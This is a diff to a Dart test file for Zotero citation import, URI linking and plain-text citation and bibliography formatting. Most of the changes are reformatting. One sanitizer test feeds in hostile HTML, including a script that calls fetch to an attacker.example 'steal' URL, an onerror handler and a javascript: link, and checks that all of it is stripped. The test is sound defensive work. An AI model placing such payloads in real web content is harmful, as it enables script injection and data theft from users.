@@ -39,7 +39,7 @@ ZoteroCitationItem _citation({
   bool authorOnly = false,
 }) => ZoteroCitationItem.fromJson({
   'id': id,
-  'uris': [if (uri != null) uri],
+  'uris': [?uri],
   'itemData': _source(
     id: id,
     title: title,
@@ -47,10 +47,10 @@ ZoteroCitationItem _citation({
     given: given,
     year: year,
   ),
-  if (locator != null) 'locator': locator,
-  if (label != null) 'label': label,
-  if (prefix != null) 'prefix': prefix,
-  if (suffix != null) 'suffix': suffix,
+  'locator': ?locator,
+  'label': ?label,
+  'prefix': ?prefix,
+  'suffix': ?suffix,
   if (suppressAuthor) 'suppress-author': true,
   if (authorOnly) 'author-only': true,
 });
@@ -87,27 +87,32 @@ void main() {
       expect(records.every((item) => item.itemData!['id'] == item.id), isTrue);
     });
 
-    test('links explicit personal and group URIs without conflating identical keys', () {
-      final sources = [
-        {..._source(), 'uri': 'http://zotero.org/users/123/items/ABCD1234'},
-        {
-          ..._source(),
-          'uris': ['https://zotero.org/groups/123/items/ABCD1234'],
-        },
-      ];
-      final result = zoteroImportCslJson(jsonEncode(sources));
-      expect(result.first.uris, ['http://zotero.org/users/123/items/ABCD1234']);
-      expect(result.last.uris, [
-        'https://zotero.org/groups/123/items/ABCD1234',
-      ]);
-      expect(result.first.id, isNot(result.last.id));
-      final user = ZoteroSourceAddress.parse(result.first.uris.single)!;
-      final group = ZoteroSourceAddress.parse(result.last.uris.single)!;
-      expect(user.library.type, ZoteroLibraryType.user);
-      expect(group.library.type, ZoteroLibraryType.group);
-      expect(user.library.id, 123);
-      expect(group.key, 'ABCD1234');
-    });
+    test(
+      'links explicit personal and group URIs without conflating identical keys',
+      () {
+        final sources = [
+          {..._source(), 'uri': 'http://zotero.org/users/123/items/ABCD1234'},
+          {
+            ..._source(),
+            'uris': ['https://zotero.org/groups/123/items/ABCD1234'],
+          },
+        ];
+        final result = zoteroImportCslJson(jsonEncode(sources));
+        expect(result.first.uris, [
+          'http://zotero.org/users/123/items/ABCD1234',
+        ]);
+        expect(result.last.uris, [
+          'https://zotero.org/groups/123/items/ABCD1234',
+        ]);
+        expect(result.first.id, isNot(result.last.id));
+        final user = ZoteroSourceAddress.parse(result.first.uris.single)!;
+        final group = ZoteroSourceAddress.parse(result.last.uris.single)!;
+        expect(user.library.type, ZoteroLibraryType.user);
+        expect(group.library.type, ZoteroLibraryType.group);
+        expect(user.library.id, 123);
+        expect(group.key, 'ABCD1234');
+      },
+    );
 
     test('a canonical URI in the CSL id is a linked source', () {
       const uri = 'https://www.zotero.org/users/42/items/EFGH5678';
@@ -209,18 +214,21 @@ void main() {
   });
 
   group('formatted references become inert text', () {
-    test('removes scripts, styles and resource tags while preserving reference text', () {
-      final text = zoteroHtmlToPlainText(
-        '<style>body { background:url(https://attacker.example/image); }</style>'
-        '<ScRiPt>fetch("https://attacker.example/steal")</sCrIpT>'
-        '<div><img src="https://attacker.example/image" onerror="alert(1)">'
-        '<a href="javascript:alert(1)">A useful source</a></div>'
-        '<p>Second <i>reference</i><br />next line</p>',
-      );
-      expect(text, 'A useful source\nSecond reference\nnext line');
-      expect(text, isNot(contains('attacker.example')));
-      expect(text, isNot(contains('alert')));
-    });
+    test(
+      'removes scripts, styles and resource tags while preserving reference text',
+      () {
+        final text = zoteroHtmlToPlainText(
+          '<style>body { background:url(https://attacker.example/image); }</style>'
+          '<ScRiPt>fetch("https://attacker.example/steal")</sCrIpT>'
+          '<div><img src="https://attacker.example/image" onerror="alert(1)">'
+          '<a href="javascript:alert(1)">A useful source</a></div>'
+          '<p>Second <i>reference</i><br />next line</p>',
+        );
+        expect(text, 'A useful source\nSecond reference\nnext line');
+        expect(text, isNot(contains('attacker.example')));
+        expect(text, isNot(contains('alert')));
+      },
+    );
 
     test(
       'decodes named and numeric entities and preserves multilingual text',
@@ -311,25 +319,28 @@ void main() {
       );
     });
 
-    test('corporate authors, missing authors and missing dates have readable fallbacks', () {
-      final corporate = ZoteroCitationItem.fromJson({
-        'id': 'corporate',
-        'itemData': {
-          'type': 'report',
-          'title': 'A report',
-          'author': [
-            {'literal': 'Research Council'},
-          ],
-          'issued': {'literal': 'Spring 2022'},
-        },
-      });
-      final anonymous = ZoteroCitationItem.fromJson({
-        'id': 'anonymous',
-        'itemData': {'type': 'book', 'title': '<i>Anonymous work</i>'},
-      });
-      expect(zoteroBasicCitation([corporate]), '(Research Council, 2022)');
-      expect(zoteroBasicCitation([anonymous]), '(Anonymous work, n.d.)');
-    });
+    test(
+      'corporate authors, missing authors and missing dates have readable fallbacks',
+      () {
+        final corporate = ZoteroCitationItem.fromJson({
+          'id': 'corporate',
+          'itemData': {
+            'type': 'report',
+            'title': 'A report',
+            'author': [
+              {'literal': 'Research Council'},
+            ],
+            'issued': {'literal': 'Spring 2022'},
+          },
+        });
+        final anonymous = ZoteroCitationItem.fromJson({
+          'id': 'anonymous',
+          'itemData': {'type': 'book', 'title': '<i>Anonymous work</i>'},
+        });
+        expect(zoteroBasicCitation([corporate]), '(Research Council, 2022)');
+        expect(zoteroBasicCitation([anonymous]), '(Anonymous work, n.d.)');
+      },
+    );
   });
 
   group('basic bibliography fallback', () {
@@ -393,21 +404,24 @@ void main() {
       expect(zoteroBasicBibliography(sources).split('\n\n'), hasLength(1));
     });
 
-    test('keeps container/DOI data, strips title markup and skips missing snapshots', () {
-      final source = ZoteroCitationItem.fromJson({
-        'id': 'enriched',
-        'itemData': {
-          ..._source(title: '<i>A</i> &amp; <b>B</b>'),
-          'container-title': 'Journal of Examples',
-          'DOI': '10.1234/example',
-        },
-      });
-      final missing = ZoteroCitationItem.fromJson({'id': 'no-data'});
-      final text = zoteroBasicBibliography([missing, source]);
-      expect(
-        text,
-        'Hassan, Amal (2024). A & B. Journal of Examples. https://doi.org/10.1234/example',
-      );
-    });
+    test(
+      'keeps container/DOI data, strips title markup and skips missing snapshots',
+      () {
+        final source = ZoteroCitationItem.fromJson({
+          'id': 'enriched',
+          'itemData': {
+            ..._source(title: '<i>A</i> &amp; <b>B</b>'),
+            'container-title': 'Journal of Examples',
+            'DOI': '10.1234/example',
+          },
+        });
+        final missing = ZoteroCitationItem.fromJson({'id': 'no-data'});
+        final text = zoteroBasicBibliography([missing, source]);
+        expect(
+          text,
+          'Hassan, Amal (2024). A & B. Journal of Examples. https://doi.org/10.1234/example',
+        );
+      },
+    );
   });
 }
